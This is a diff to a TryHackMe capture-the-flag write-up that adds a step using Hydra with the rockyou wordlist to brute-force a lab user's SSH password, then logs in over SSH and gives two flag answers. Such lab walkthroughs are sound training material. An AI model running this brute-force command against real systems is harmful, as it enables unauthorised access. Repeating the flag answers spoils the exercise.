@@ -20,4 +20,27 @@
 ![image](https://user-images.githubusercontent.com/62840507/128612618-53e8b508-20c2-47ac-80ea-1dfd8084c80b.png)
 
 
-**Solution :** THM{2673a7dd116de68e85c48ec0b1f2612e}
+Login with these credentials and you will find the flag.
+
+**Flag1 :** THM{2673a7dd116de68e85c48ec0b1f2612e}
+
+
+##### 2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
+
+* We need SSH password. Command I used
+
+``` hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.166.155 ssh -t 4 ```
+
+![image](https://user-images.githubusercontent.com/62840507/128612950-a4045c04-23ef-437c-8866-7140512b8bdb.png)
+
+
+* Now that we have the SSH password, we can login in with those credentials.
+
+```ssh molly@10.10.166.155```
+
+![image](https://user-images.githubusercontent.com/62840507/128613063-397a5fde-6554-4a2c-9513-37d0569b3948.png)
+
+
+**Flag2 :** THM{c8eeb0468febbadea859baeb33b2541b}
+
+
